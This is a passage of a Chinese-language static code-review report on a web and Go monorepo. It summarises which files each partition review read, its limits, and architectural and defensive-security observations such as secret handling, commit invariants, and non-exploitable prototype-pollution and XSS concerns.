为验证调用路径与契约,我还只读地阅读了分区之外的代码:packages/workspace-sync/src/workspaceOutbox.ts、packages/workspace-sync/src/workspaceResolutionOperation.ts、packages/workspace/src/workspaceCodec.ts(encode/decodeWorkspaceSnapshot)、packages/workspace/src/workspaceHistory.ts(createWorkspaceHistoryState/setWorkspaceHistoryLimit)、apps/web/src/editor/Editor.tsx(workspace 加载 + 本地项目恢复)、apps/web/src/editor/features/revisionConflict/WorkspaceRevisionConflictSurface.tsx、apps/web/src/editor/features/settings/SettingsEffects.tsx,以及 apps/web/src/editor/localProjectStore.ts(serializeRecord/mutateLocalProject)。

未覆盖:我没有执行任何代码(纯静态审查),因此发现 3 的 codec 键序分歧是依据 encode/decode 源码论证的,而不是通过一次复现运行得出的。我也没有审计分区之外的消费方,只做到足以确认可达性的程度(例如约 30 处 dispatchWorkspaceAuthoringOperation 调用点是抽样阅读,而非全部读完)。"

**结构观察**: 架构不变量的整体遵守情况良好:该分区中任何地方都没有用 localStorage 做领域持久化(唯一的使用是 useSettingsStore.ts:49 中的 `i18nextLng`,属于 UI 偏好);没有任何密钥材料进入 snapshot、outbox 条目或日志;没有直接的 VFS 覆写 —— 每一次 authoring 写入都走 Command/Transaction -> WorkspaceOperation -> outbox -> Atomic Commit;运行时状态存放在可丢弃的 `runtimeStateByProject` map 中,并由 `clearWorkspaceState` 清理。

风险热点按优先级排列:(1) 冲突生命周期横跨四个模块(executor、preparation、effects、surface),而「一条被阻塞的 outbox 条目恰好被释放一次」这一不变量,是由 `persistInitialEntry` 的 `replaceEntryId` 隐式保障的。该不变量既没有唯一负责方也没有测试,这正是发现 1 和发现 2 的来源。(2) `WorkspaceOutboxEffects.adoptResumeResult` 是 `WorkspaceOutboxOperationExecutionResult` 的唯一消费方,却丢弃了其中两个字段(`rebased` 与 `retryAt`),把四种语义上不同的结果压缩到同一个 store action 上。(3) `localProjectWorkspaceOutbox` 是唯一通过序列化来判断 snapshot 相等性的地方;其他所有地方都使用 revision 计数器。

未列为发现的次要事项:`applyAcknowledgedSettingsMutation`(workspaceSettingsOutboxExecutor.ts:434)在整个仓库中没有任何调用方,属于生产死代码;`executeWorkspaceSettingsOutboxCommit` 虽被导出且有测试,但同样没有生产调用方。`blueprintStateByProject` 从未被 `removeProject`/`clearWorkspaceState` 清理(editorStore.projectSlice.ts:60、editorStore.workspaceSlice.ts:295),而 `runtimeStateByProject` 会被清理 —— 这是一个小的无界 map,其上限是单次会话中访问过的项目数。在 `WorkspaceOutboxEffects` 中,`catch` 分支与 `finally` 的重跑分支可能在同一轮里各自给 `retryTimerRef.current` 赋值,使较早的句柄成为孤儿,从而在卸载清理时被遗漏;该孤儿定时器会在下一个 tick 自行终止,因为 `run()` 在 `resumeBase.id !== workspaceId` 时会直接返回,所以它是一次性的游离定时器而非循环。`useSettingsStore.normalizeProjectGlobalById` 把可被攻击者影响的键写入一个全新的对象字面量,因此来自服务端设置的 `__proto__` 键只会重新指定该对象自身的原型,而不会污染 `Object.prototype` —— 就现有实现而言不可利用,但如果设置文档将来变为多租户,值得改用 `Object.create(null)` 或加键名过滤。

### 5.3 `web-execution` — apps/web execution + testing surfaces

**覆盖范围**: 完整阅读了(生产代码):ExecutionCenter.tsx、ExecutionFilesystemChangesPanel.tsx、ExecutionTerminalEmulatorSurface.tsx、animationExecutionClient.ts、browserDataExecutionEnvironment.ts、browserProjectExecutionEnvironment.ts、executionCenterNavigation.ts、executionConsoleModel.ts、executionFilesystemChanges.types.ts、executionNetworkModel.ts、executionServerFunctionModel.ts、executionSourceTraceModel.ts、executionTerminalKeyboard.ts、index.ts、nodeGraphExecutionClient.ts、remoteDataGatewayClient.ts、remoteDataGatewayRunCoordinator.ts、remoteDataStreamGatewayClient.ts、remoteDataStreamRunCoordinator.ts、remoteExecutionHttpPort.ts、remotePreviewOriginClient.ts、remoteProjectExecutionEnvironment.ts、remoteServerFunctionGatewayClient.ts、remoteServerFunctionRunCoordinator.ts、runtimeFilesystemAssetUpload.ts、useExecutionFilesystemChanges.ts、useExecutionSession.ts、useRemoteExecutionTerminal.ts、useWorkspaceExecutionSourceNavigation.ts、workspaceAssetMaterialization.ts、workspaceExecutionIdentity.ts、workspaceExecutionSourceNavigation.ts;testing/ 目录:ProjectTestingPage.tsx、projectTestExecutionClient.ts、projectTestExecutionPlan.ts、projectTestReportModel.ts、useProjectTestRunner.ts、index.ts,以及两个 fixture。测试文件按其断言语义和测试策略合规性做了粗读(逐文件核对断言数量;未发现 DOM 层级/querySelector/closest/parentElement/snapshot 断言,也没有无断言的测试)。为验证调用路径,我还阅读了分区之外的支撑代码:packages/runtime-core(executionSession.ts、executionRequest.ts、executableProject.ts、executableProjectNormalization.ts、executionDataStreamBridge.ts、executionTerminalController.ts、execution.types.ts)、packages/runtime-remote(remoteExecutionProvider.ts、remoteExecutionTerminalCodec.ts、remoteExecutionTerminalBroker.ts)、packages/prodivix-compiler/src/executableProject/workspaceExecutableProject.ts、apps/backend/internal/modules/remoteexecution/data_gateway_stream.go、apps/web 的 BlueprintEditor.tsx + useBlueprintProjectRunner.ts 以及 workspaceSync/workspaceAuthoringOperationDispatcher.ts。未覆盖:由 browserDataExecutionEnvironment.ts 组合的 @prodivix/data*、@prodivix/server-runtime 和 @prodivix/runtime-browser 适配器的内部实现(在分区之外),并且没有执行任何代码。

**结构观察**: 该分区的密钥处理很有纪律,我没有发现泄漏:bearer token 只出现在 Authorization 头中,并配合 `credentials:'omit'`、`redirect:'error'`、`cache:'no-store'`;终端的 bearer 被刻意保存在 ref 而非 React state 中(useRemoteExecutionTerminal.ts:62);错误响应体经由白名单过滤(`REMOTE_DATA_GATEWAY_SAFE_ERROR_CODES`、`REMOTE_SERVER_FUNCTION_SAFE_ERROR_CODES`),因此 provider 私有的消息不会进入 console/network 模型;console 与终端投影只渲染已脱敏的记录,并显式暴露 `redacted`/`truncated` 标记。`localStorage` 仅用于面板高度这一 UI 偏好(ExecutionCenter.tsx:94-125),符合不变量 3。

运行时文件系统变更的采纳(useExecutionFilesystemChanges.ts:171-294)正确地走 `createWorkspaceRuntimeFilesystemProposal` -> 单个可逆 Transaction -> `dispatchWorkspaceAuthoringOperation` -> Outbox,并在资源上传之后重新检查资格;该分区中不存在任何直接的 VFS 写入。执行 snapshot 保持可丢弃 —— execution/ 中没有任何代码把 session、console、network 或 trace 状态写入 Workspace。

三个 run coordinator 中的 generation 围栏(`current`/`isCurrent` + `advanceGeneration` + `closeAll`/`abortActiveRequests`)在每一个 await 边界上都得到一致应用,`remoteServerFunctionRunCoordinator` 中的 AbortController 记账(在 `finally` 中做身份校验后删除)是正确的。`remoteDataStreamGatewayClient` 中的 NDJSON 读取器在所有路径的 `finally` 中都释放了 reader 锁,并在多次重连之间共享同一份字节/记录预算。

两项严重度较低、我选择不作为缺陷提交的事项:(a) `ExecutionCenter.tsx:367-390` 在检查 `navigationRequest.sessionId !== sessionId` 之前就调用了 `setCollapsed(false)`,因此一个指向其他 session 的诊断请求会展开该面板却永远不会被消费 —— 该请求会一直闩锁在 zustand store 中,直到被更新的请求替换;这看起来是有意为之(该请求在等待对应的 session 变为可见),但很容易被误读。(b) `useRemoteExecutionTerminal.refresh` 在每 250 ms 的轮询中都会重写 `error: undefined` 和 `phase: 'open'`,因此 `input-unacknowledged`/`resize-unacknowledged` 提示条可能在用户读到之前就被抹掉。两者都属于 UX 层面,而非正确性失败。

### 5.4 `web-code-anim-graph` — apps/web code / animation / nodegraph editors

**覆盖范围**: 完整阅读了:apps/web/src/editor/features/code(CodeAuthoringWorkspace.tsx 2107 行、useCodeAuthoringSession.ts、workspaceCodeArtifacts.ts、codeAuthoringModel.ts、CodeFileTree.tsx、CodeEditorActionOverlays.tsx、CodeAuthoringOverlay.tsx、CodeAuthoringPage.tsx、codeAuthoringOverlayStore.ts、openCodeAuthoring.ts、shaderCodeMirrorLanguage.ts,以及两个测试文件)。apps/web/src/editor/features/animation(useAnimationEditorState.ts 1296 行、AnimationEditor.tsx、AnimationEditorContent.tsx、AnimationDocumentControls.tsx、animationEditorUi.ts、state/nodeTargetOptions.ts、panels/InspectorPanel、PreviewCanvas、TimelinePanel、KeyframesEditor、SvgFilterLibrarySection、TopBar,以及两个测试)。apps/web/src/editor/features/development/reactflow(NodeGraphEditorContent.tsx、nodeGraphDocumentProjection.ts、nodeGraphStableNode.ts、nodeGraphFlowNodes.ts、nodeGraphRenderStore.ts、nodeGraphEditorModel.ts、nodeGraphEditorUtils.ts、nodeGraphNodeActions.ts、nodeGraphConnectionActions.ts、nodeGraphNodeChanges.ts、nodeGraphGroupLayout.ts、nodeGraphMenuModel.ts、nodeGraphWorkspaceDocuments.ts、useNodeGraphWorkspaceDocumentManager.ts、graphConnectionValidation.ts、graphPortUtils.ts、graphNodeShared.tsx、nodeCatalog.ts、GraphNode.tsx、NodeGraphCanvas.tsx、NodeGraphGraphManager.tsx、useNodeGraphColorMode.ts、useNodeGraphLocalization.ts、nodes/CodeGraphNode.tsx、nodes/StickyNoteEditor.tsx、nodes/annotationMarkdown.tsx,以及 workspace-documents 测试)。

为确认或排除疑点而做的跨包验证:packages/workspace/src/workspaceNodeGraphDocument.ts、packages/workspace/src/authoring/workspaceCodeArtifactLifecycle.ts、packages/workspace/src/authoring/createWorkspaceCodeSlotRegistryFromSnapshot.ts、packages/nodegraph/src/nodeGraphCodec.ts、packages/animation/src/animationAuthoring.ts 与 animationCodec.ts、apps/web/src/App.tsx + editor/Editor.tsx(路由门控)、apps/web/tsconfig.json。

未完整覆盖(仅粗读结构/处理函数,均为由共享运行时数据驱动的展示型渲染辅助代码):reactflow/nodes/*.tsx 下除 CodeGraphNode/StickyNoteEditor/annotationMarkdown 之外的约 20 个文件、reactflow/nodeCatalogData/**(声明式目录表)、nodeGraphEditor.css、nodeGraphEditorConstants.ts、nodeGraphI18nTypes.ts、nodeGraphNodeTypes.ts、NodeGraphContextMenu.tsx、NodeGraphViewportControls.tsx。

经调查后因不可达而有意未报告的判断:(a) CodeAuthoringWorkspace 的创建/重命名/删除处理函数中的 `!workspaceRev` 假值守卫 —— `workspaceCodec.ts` 强制 `requirePositiveInteger`,因此 rev 0 不会出现;(b) CodeAuthoringPage.tsx:25-30 中的空值解引用(`semanticNavigationRequest?.workspaceId === workspace?.id && semanticNavigationRequest.projectId`,当两者均为 null 时会抛错,且因为 apps/web 设置了 `strict: false` 而不会被捕获)—— Editor.tsx 把 `<EditorSurface/>` 门控在 `workspace && workspace.id === projectId` 之后,所以此处 `workspace` 永远不会为 null;(c) `inferConnectedPorts` 中 `id.includes('.control')` 的误分类 —— 目录中没有任何 handle id 在前缀之外还包含 `.control`;(d) AnimationEditorTopBar 中位于 disabled `<button>` 内部的 delete-timeline `<span role="button">` —— 浏览器会抑制被禁用表单控件子树上的鼠标事件,因此只读状态不会被绕过。

**结构观察**: 该分区的架构不变量遵守得相当好。我追踪的每一次 authoring 写入都经由可逆 Command / 原子 Transaction 和 `dispatchWorkspaceAuthoringOperation` —— 没有任何编辑器直接写 VFS。Code 节点的源码是严格的只读投影(`nodeGraphFlowNodes.ts:482  code: codeArtifact?.source ?? ''`),编辑则通过 `createWorkspaceCodeSourceUpdateCommand` 回流;`EDITOR_ONLY_NODE_DATA_FIELDS` 正确地在持久化之前剥离 `code`/`codeLanguage`/`codeArtifactOptions`,而 `nodeGraphCodec.decodeNode` 甚至会拒绝 `kind:'code'` 节点上内嵌的 `code` 字段。localStorage 只用于树选择状态(`getCodeAuthoringSelectionStorageKey`),属于被允许的 UI 偏好。该分区中没有任何 `dangerouslySetInnerHTML`、`eval` 或 `new Function`;`annotationMarkdown.tsx` 通过 React 元素渲染,并带有 href 白名单。

F2 重命名确实是 fail-closed 的:`applyCodeLanguageRename` 在 `affectedBindings.length > 0` 时拒绝执行,`previewCodeLanguageRename` 会拒绝 `stale` 的影响面,CodeAuthoringWorkspace.tsx:503-512 在任何 `workspace.workspaceRev` 变化时重置重命名状态。重定位以及孤儿的 rebind/convert 同样走经过校验的计划。

除已报告缺陷之外值得关注的热点/风险区:

- `CodeAuthoringWorkspace.tsx` 共 2107 行,包含 10 个 effect,通过两个 `LatestRequestGate` ref 交叉失效三个 overlay 状态机。已报告的删除 fail-open 正是「策略被大量内联在此处」的症状;把 CodeSlot 生命周期策略和 overlay 状态机抽成 hook,会让 fail-closed 规则变得可审计。
- `NodeGraphEditorContent.tsx` 在同一份 `nodes`/`edges` 状态上运行一个 hydrate effect 和一个 commit effect,并用三个协调 ref(`hydratedDocumentIdRef`、`hydratedSignatureRef`、`suppressNextCommitRef`)配合。我追踪了文档切换时的时序(由于 `persistCanvas` 的身份随 `activeGraphId` 变化,commit effect 可能提前一次消费掉抑制标志),它目前之所以能收敛,仅仅是因为那次冗余写入产生了一个 `null` command。这是一个脆弱的不变量。
- NodeGraphEditorContent.tsx:543-554 处的 `fitView` effect 依赖 `flowNodeIdsSignature`,因此每当有节点被创建或删除,视口就会重新适配 —— 从画布右键菜单创建节点会把镜头从光标处拽走。属于行为问题而非缺陷,但很可能并非本意。
- `useNodeGraphLocalization.localizeNodeLabel` 会把翻译后的标签写入 `node.data.label`,而 `label` 是会被持久化的,因此新建节点和起始图会把依赖语言环境的内容带入 canonical 文档,而已有节点则保留其原始语言。
- `GraphNode.tsx` 订阅了 `state.nodesById.get(id)` 并把 `runtimeNode` 传入 `buildRuntimeNodeData`,但 `data` 随即被 `fallbackNodeData` 覆盖,因此 `runtimeNode` 除了充当一个依赖项、使每次节点数组变化时所有节点的 memo 都重新计算之外,没有任何贡献。
- `useCodeAuthoringSession.updateSession` 在 `setState` 更新函数内部给 `sessionRef.current` 赋值;`save()` 中的 `savingArtifactId` 重入守卫依赖该赋值已经发生,而 `Mod+S` 快捷键只检查 `isMutating` 而不检查 `isSaving`。我无法构造出确定性的重复派发,因此未作报告,但这种「在更新函数内部写 ref」的模式,与 `nodeGraphFlowNodes.ts` 和 `addBinding` 中已确认失效的模式是同一种。
- 该分区的测试符合策略 —— 它们按 role/label 查询,并对公共回调和 canonical command 输出作断言,没有 DOM 层级、`querySelector` 或 snapshot 断言。

### 5.5 `web-resources-issues` — apps/web resources / issues / export / settings

**覆盖范围**: 完整阅读了:features/resources(PublicResourcePage.tsx、ExternalLibraryManager.tsx + externalLibraryManager/managerRuntimeRefs.ts、ProjectFileManager.tsx、projectFileStore.ts、I18nResourcePage.tsx、i18nResourceModel.ts、workspaceI18nResources.ts、DesignTokenResourcePage.tsx、DataResourcePage.tsx、DataOpenApiImportPanel.tsx、DataManualAuthoringPanel.tsx、DataOperationTestPanel.tsx、dataOpenApiImportSession.ts、workspaceDataOpenApiImport.ts、AuthServerRuntimeResourcePage.tsx、workspaceAuthServerRuntime.ts、workspaceResourceDocuments.ts、workspacePublicResources.ts、workspaceExternalLibraries.ts、publicTree.ts、publicResourceModel.ts、projectResourceOverview.ts、ProjectResources.tsx、ResourceFileTree.tsx、latestResourceValuePersistence.ts);features/issues(workspaceIssueProviders.ts、workspaceIssueQuickFixRegistry.ts、workspaceIssuesStore.ts、WorkspaceIssuesEffects.tsx、WorkspaceIssuesPage.tsx、workspaceCodeIssueProvider.ts、workspaceAnimationIssueProvider.ts);features/export(ExportCode.tsx、exportCodeModel.ts、exportZip.ts、ExportCodePreview.tsx);features/settings(SettingsEffects.tsx、SettingsDefaults.ts、WorkspaceCollaborationSettings.tsx);features/revisionConflict(WorkspaceRevisionConflictSurface.tsx、revisionConflictPresentation.ts、nodeGraphDiffAdapter.ts、revisionConflictAdapterUtils.ts);features/testing(projectTestExecutionPlan.ts、projectTestExecutionClient.ts、useProjectTestRunner.ts、ProjectTestingPage.tsx 开头部分);features/component(useWorkspaceComponentAuthoring.ts、ComponentAuthoringPage.tsx);features/newfile(NewResourceModal.tsx)。为验证结论,交叉核对了分区之外的支撑代码:packages/data-http/src/dataOpenApiImporter.ts、packages/workspace/src/workspaceServerRuntimeAuthConfiguration.ts 与 workspaceDocumentValidation.ts、packages/diagnostics/src/diagnosticIssueCollection.ts、packages/runtime-core 的 executionJob 完成语义、apps/web/src/editor/store/editorStore.workspaceSlice.ts + editorStore.workspaceSyncSlice.ts、apps/web/src/editor/workspaceSync/workspaceAuthoringOperationDispatcher.ts 与 workspaceSettingsOutboxAdoption.ts、apps/web/src/editor/features/execution/workspaceAssetMaterialization.ts。未深入覆盖:features/revisionConflict/NodeGraphDiffView.tsx 与 CodeDocumentDiffView.tsx(纯展示型 SVG/diff 渲染)、features/component/components/contractEditor/_(表单 UI)、features/resources/templates/licenses/_.txt(许可证文本),以及该分区的 *.test.ts(x) 文件(仅粗读,以确认其预期语义)。

**结构观察**: 该分区的密钥处理确实干净,并且看得出是有意设计的。`dataResourceModel.ts` 只投影 `secret-ref`/`environment-ref` 绑定的 _id_,从不投影值;`AuthServerRuntimeResourcePage` 完全不接受凭据输入(其测试断言不存在任何 token/cookie/secret 字段);`collectExecutionSessionIssueSnapshot` 会刻意剥离 provider 私有的元数据,并以有界的执行关联信息替代,配套的回归测试断言凭据金丝雀绝不会到达 Issues。`materializeWorkspaceBinaryAssets` 把访问令牌保留在请求层,因此嵌入 ExportCode 错误包的 `String(error)`(ExportCode.tsx:140)不可能携带它 —— 我专门检查了这一点,因为该路径会把错误字符串写入生成的源码文件。

Issues 中的 revision 绑定是可靠的:`WorkspaceIssuesEffects` 为每次 Workspace 变化生成一个 revision,用 `cancelled` 标志守卫每一次异步发布,而 `upsertDiagnosticProviderSnapshot` 会拒绝过期或冲突的 revision。Quick fix 通过受信任的工厂和 `dispatchWorkspaceAuthoringOperation` 执行 —— 诊断永远不携带可执行负载。OpenAPI 导入路径的围栏是正确的(在预览时捕获 `expectedContentRev` 并在采纳时重新校验;当文档在此期间已出现时,创建路径会阻断),并且从不请求外部的 identity URL。

该分区中占主导的系统性风险是一个反复出现的 React 模式:某些 effect 的依赖数组中包含由整个 `WorkspaceSnapshot` 派生的对象(或内联的父级回调),却被用来重置编辑器草稿。由于*任何* Workspace 变更 —— 包括经 `applyWorkspaceMutation` 采纳的设置提交 —— 都会替换该 snapshot 对象,这些 effect 触发得远比预期频繁,并会冲掉用户未保存的输入。发现 2、3 即为其实例;`DesignTokenResourcePage` 展示了正确的写法(以 `content`/`contentRev`/`id` 为键)。

第二个系统性风险是静默的写入失败。四个彼此独立的界面(i18n、项目文件、外部库、issues 重试)都以乐观方式接受编辑,随后把拒绝结果丢进 `void`、空 `catch` 或 `console.warn`。尽管 store 已暴露 `workspaceReadonly`,它们没有一个在只读时禁用自身控件,于是一个只读的 Workspace 会产生看似成功随后消失的编辑。在 `dispatchWorkspaceAuthoringOperation` 旁边提供一个共享的「authoring 结果 → 状态区」辅助函数,可以一次性堵上这四处。

`apps/web/src/editor/features/revisionConflict/nodeGraphDiffAdapter.ts` 是这里复杂度最高的文件(818 行的三路投影,含 LOCAL/REMOTE 视觉配对)。我追踪了冲突配对和悬空端点这两项不变量,发现它们由 `validateNodeGraphDiffPresentation` 守护,但 `endpointVisualId` 的回退 `side ?? 'remote'`(第 653 行)和 `touchesConflict` 的重复分支,是最有可能藏着只有基于生成式三路输入的属性测试才能暴露的缺陷之处;仅凭静态阅读我无法构造出具体的失败输入,因此没有报告。

该分区的测试质量良好,且不违反既定策略 —— `workspaceIssueProviders.test.ts` 和 `AuthServerRuntimeResourcePage.test.tsx` 断言的是行为以及否定式的密钥正则,而不是 DOM 结构。

### 5.6 `web-plugins-shell` — apps/web plugin platform, pir adapters, app shell

**覆盖范围**: 完整阅读了:apps/web/src/plugins 下的全部生产代码(platform/_.ts(x)、platform/contributions/_.ts、browser/conformanceHarness.ts、officialComponentPluginConformanceHarness.tsx、types.ts、index.ts),以及 apps/web/src/pir(pirWebRendererHost.tsx、createPublishedPirProjection.ts,加上四个零字节文件)。应用外壳完整阅读:main.tsx、App.tsx、i18n/index.ts、infra/api/apiClient.ts + apiConfig.ts、auth/useAuthStore.ts + AuthSessionSync.tsx + authApi.ts、community/CommunityDetailPage.tsx + communityApi.ts、ai/aiSettingsStore.ts、theme/themeRuntime.ts、components/ThemeSync.tsx、shortcuts/guards.ts + useWindowKeydown.ts、esm-bridge/registerHostReactBridge.ts、infra/git/browserGitClient.ts;ProfilePage.tsx 为部分阅读(定时器/effect/API 相关部分)。为验证调用路径与结论而阅读的跨分区文件:packages/plugin-contracts/src/validateRenderPolicyContribution.ts、renderPolicy.ts、contributionValidation.ts;packages/pir-react-renderer/src/host/registry.ts、host/pirRendererHost.ts、host/iconRegistry.ts、node/PIRElementProjection.tsx、runtime/reactProjection.ts;packages/plugin-antd 的 render-policy.json;editor/features/blueprint/palette/projectionResolver.ts 和 assistant/BlueprintAssistantSettingsModal.tsx;apps/web/vite.config.ts。我用脚本对全部八个 i18n 命名空间做了 en 与 zh-CN 的键覆盖差异比对(共 3,634 个键):唯一的差异是 `inspector.panels.layout-pattern.description` 存在于 en/blueprint.json 而在 zh-CN 中缺失,且没有代码引用该键,因此未作报告。未深入覆盖:home/Home.tsx、AuthPage.tsx、CommunityPage.tsx 的展示型主体、assets/icons/**、infra/git/browserGitAssetProjection.ts,以及体量较大的插件 **tests** 文件(仅粗读以排查策略违规 —— 未发现;该分区的测试中没有使用 querySelector/closest/parentElement/snapshot)。

**结构观察**: 已检查并确认无问题的项(值得作为否定性结论记录):(1) 不受信任的社区 PIR 渲染不是 XSS 路径 —— `stripChildProps` 会在 void/无子元素路径上删除 `dangerouslySetInnerHTML`,React 19 在 `dangerouslySetInnerHTML` 与子元素并存时会抛错,而 react-dom 19.2.7 通过 `isJavaScriptProtocol`/`sanitizeURL` 净化 `javascript:` URL,因此 pirWebRendererHost 中较为宽松的 `HTML_ELEMENTS` 白名单不会成为注入向量。(2) `renderPolicyResolver.unsupportedSurfaceRequirement` 针对 `container-native` 提前返回是安全的,因为 `validateSurfaceRequirements` 已经为该兼容级别固定了 viewport/browserMetrics/styles/focusKeyboard/intrinsicSize。(3) `decodeRenderPolicyContributionV2` 会回填 `rule.surface ?? descriptor.surface`,因此 resolver 中新增的 `rule.surface` 解引用不可能为 undefined。(4) officialSurfaceHost、officialHostImplementations、externalLibraryResolver、blueprintTemplateResolver 和 iconProviderResolver 中的 lease/claim 记账是按 lease 计数且释放对称的;abort 监听器会在结算时被移除。

结构性风险区:(a) `officialHostImplementations.listBindings`(第 508 行)、`createWebPluginPlatform.listBundledInstallations`(第 438 行)、`officialSurfaceHost.listSnapshots`(第 237 行)和 `collectUnavailableBundledOfficialComponentDiagnostics`(bundledOfficialPlugins.ts:120)都使用 `localeCompare` 来决定输出顺序。这些结果依赖 ICU/语言环境;packages/pir-react-renderer 中的同类代码则刻意改用基于 `<`/`>` 的 `compareText` 比较器。一旦其中任何一处排序进入被记录的一致性验证产物或诊断 snapshot,它在不同语言环境下就会变得不确定。(b) `createExternalComponentMetadata`(extensionQueryService.tsx:118)以裸的 `runtimeType` 作为键,而同级的库映射以 owner+generation+libraryId 为键;在 generation 重叠期间,该元数据投影会静默地采用「最后写入者获胜」。(c) 两个一致性验证 harness(`plugin-sandbox-conformance.html`、`official-component-plugin-conformance.html`)在 apps/web/vite.config.ts 中被声明为生产环境的 `rollupOptions.input` 条目,并暴露 `window.prodivixPluginSandboxConformance` / `window.prodivixOfficialComponentPluginConformance`,其中包括一个 `isGranted: () => true` 的权限桩。它们不接触任何用户 Workspace 或凭据,因此我没有立案,但把它们发布到生产源站是不必要的攻击面。(d) 会话令牌被持久化到 `localStorage['prodivix-auth-session']`,这是常见做法,但意味着该源站上任何位置的脚本注入都能获得完整会话 —— 这正是发现 #1 所涉及的同一存储。

### 5.7 `be-workspace` — backend workspace module (Go)

**覆盖范围**: 完整阅读了(生产代码):store.go、store_operation_commit.go、store_operation_commit_validation.go、store_settings_commit.go、store_snapshot.go、store_helpers.go、operation_commit_types.go、operation_commit_apply.go、operation_commit_wire_presence.go、handlers.go、handlers_workspace.go、handlers_operation_commit.go、handlers_settings_commit.go、handlers_asset_blob.go、handlers_asset_delivery.go、handlers_asset_import.go、module.go、routes.go、errors.go、response.go、revision_limits.go、asset_blob.go、asset_blob_retention.go、patch.go、patch_pointer.go、patch_json_value.go、patch_compare.go、vfs_tree.go、vfs_tree_paths.go、vfs_tree_mutation.go、pir_validator.go、nodegraph_validator.go、animation_validator.go、data_source_validator.go、data_source_policy_validator.go、design_token_document_validator.go、route_manifest_validator.go、route_manifest_wire_validator.go。与 apps/backend/internal/platform/database/database.go(建表 DDL、(workspace_id, path) 上的唯一索引以及 (workspace_id, operation_id) 上的部分唯一索引)和 apps/backend/internal/platform/pircontract(current_schema.generated.json、contract.go)交叉核对,确认 pir_validator.go:21-40 中未检查的类型断言确实由 schema 的 `required` 列表保障 —— 不构成发现。粗读了测试文件(operation_commit_test.go、operation_commit_vfs_test.go、operation_commit_wire_test.go、store_operation_commit_test.go、store_snapshot_boundary_test.go、asset_blob**test.go、handlers_asset**_test.go、module_bootstrap_test.go、patch_test.go、vfs_tree_test.go、route_manifest_validator_test.go、domain_document_validator_test.go、response_test.go、store_helpers_test.go、module_test.go),以了解其预期语义并排查测试策略违规;它们断言的是公共行为和 SQL 契约,没有 DOM/snapshot 耦合,我也没有发现无断言的测试。未覆盖:sqlmock 的查询串期望与精确 SQL 文本紧耦合,这虽然脆弱,但按既定策略不算缺陷;我没有执行任何代码(纯静态审查),因此清理查询(asset_blob_retention.go:35-127)的 Postgres CTE 语义只是经过推理,未经实证验证。

**结构观察**: Atomic Commit 核心的结构健康度良好。以下几点经核实为健全而非缺陷:(1) 幂等性 —— `loadWorkspaceOperationCommitRecord` 在 `SELECT ... FOR UPDATE OF w` 之后运行,并有 (workspace_id, operation_id) 上的部分唯一索引支撑;重复使用同一 id 但 canonical 请求哈希不同时,会以 ErrWorkspaceCommitIdentityMismatch fail closed;(2) revision 前置条件 —— `requirements.Route` 始终蕴含 `requirements.Workspace`,而 `normalizeAndValidateCommitExpected` 保证 `validateWorkspaceCommitPreconditions` 中被解引用的每个指针(第 412-413、442、452 行)都非 nil,因此那里不存在空指针解引用;(3) `persistWorkspaceCommitChanges` 中事务本地的 `//.prodivix-commit/N` 路径交换哨兵,在 (workspace_id, path) 唯一索引下正确处理了重命名环和「新文档占用旧路径」的情况,并且 `normalizeWorkspacePath` 永远不可能产生 `//`;(4) 每条提交分支都汇入 `rollback` 闭包,所有 `sql.Rows` 都带 `defer rows.Close()`;(5) 资源 blob 的标记/清理与提交时的保留策略对账,由共享的 `FOR UPDATE OF w` / `SKIP LOCKED` 纪律正确串行化 —— 我追踪了 READ COMMITTED 下的 EvalPlanQual 交错情形,被引用的 blob 不可能被删除(最坏情况是一次虚假的孤儿标记或一次时钟重置,两者都会在下一轮自愈);(6) 没有任何密钥材料进入日志 —— 冲突日志只输出 id 和 revision 号,而 `secret-ref` 配置值在结构上被禁止携带字面量。

除已列出的发现之外值得关注的风险区:(a) 导入路径与提交路径在文档内容校验上的分歧是系统性隐患而非个例 —— 两条路径以不同参数调用 `validateWorkspaceDocumentContent`,而 `state.validate()` 在每次提交时会重新校验*整个* workspace,因此导入路径放宽的任何一条校验,都会转化为永久性的 workspace 锁死。让两条路径共用同一个「canonical 文档准入」函数,就能封堵这整类问题;(b) `IsWorkspaceEnvelopeError`(response.go:275-287)通过对消息文本做 `strings.HasPrefix`/`strings.Contains` 来分类错误,这正是发现 2 的成因,并且会对未来任何新校验器产生静默的错误映射;(c) 若干错误路径通过遍历 Go map 来挑选要报告的文档(`validateWorkspaceCommitChangesAgainstRequirements` 第 68 行、`workspaceCommitState.validate` 第 456 行),因此当多个文档同时违规时,422 响应体在每次重试中会指向不同的文档 —— 影响不大,但会让客户端的冲突报告不可复现;(d) `PutWorkspaceAssetBlob` 在三条各自独立的池化连接上执行 INSERT/刷新/校验序列且没有事务,因此步骤之间若发生并发清理删除,就会产生虚假的 409 —— 范围足够窄,我没有立案,但把它包进单个事务会严格更好。

### 5.8 `be-auth-project-env` — backend auth / project / environment modules (Go)

**覆盖范围**: 完整阅读了该分区的每一个文件 —— apps/backend/internal/modules/{auth,project,environment} 下共 34 个文件:auth(handlers.go、store.go、middleware.go、models.go、token.go、login_limiter.go、routes.go、doc.go 及 3 个测试)、project(handlers.go、store.go、community_store.go、store_helpers.go、models.go、routes.go、doc.go)、environment(store.go、crypto.go、kms.go、aws_kms.go、key_rotation.go、handler.go、models.go、routes.go 及 6 个测试/集成测试文件)。为验证调用路径与不变量,我还阅读了分区之外的:apps/backend/server.go、internal/app/routes.go 与 runtime.go、cmd/server/main.go、internal/platform/database/database.go(完整 schema 与迁移执行器)、internal/platform/identity/random.go、internal/platform/pircontract/contract.go、internal/modules/workspace/module.go(publication 投影与 workspace 引导)、internal/modules/remoteexecution/data_gateway.go(UseSecret 的消费方契约),以及 apps/web/src/editor/ProjectHome.tsx + editorApi.ts,以确认发布路径可从 UI 到达。我没有审计配置解析器(internal/config/config.go),仅确认了 environment-secret 的 KMS 校验门控;也没有审计 workspace/remoteexecution 模块本身 —— 那些属于其他分区。

